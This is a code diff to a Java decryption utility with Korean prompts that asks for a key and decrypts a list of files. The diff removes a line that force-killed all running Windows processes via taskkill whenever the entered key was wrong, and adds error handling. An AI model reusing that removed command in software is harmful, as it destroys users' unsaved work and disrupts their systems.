@@ -21,7 +21,6 @@ public class Decrypt {
             return;
         }
 
-        // 사용자 입력을 받아 복호화 키와 비교
         Scanner sc = new Scanner(System.in);
         System.out.print("복호화 키를 입력하세요: ");
         String userInput = sc.nextLine();
@@ -29,20 +28,22 @@ public class Decrypt {
         String key = lines.get(0);
         if (!userInput.equals(key)) {
             System.out.println("키가 일치하지 않습니다.");
-            String[] command = {"cmd", "/c", "taskkill", "/f", "/fi", "status eq running"};
-            Runtime.getRuntime().exec(command);
             return;
         }
 
         List<String> encryptedFilePaths = lines.subList(1, lines.size());
 
         for (String filePath : encryptedFilePaths) {
-            File file = new File(filePath);
-            if (file.exists()) {
-                decryptFile(file, key);
-                System.out.println("Decrypted: " + filePath);
-            } else {
-                System.out.println("File not found: " + filePath);
+            try {
+                File file = new File(filePath);
+                if (file.exists()) {
+                    decryptFile(file, key);
+                    System.out.println("Decrypted: " + filePath);
+                } else {
+                    System.out.println("File not found: " + filePath);
+                }
+            } catch (Exception e) {
+                System.out.println("Failed to decrypt " + filePath + ": " + e.getMessage());
             }
         }
     }
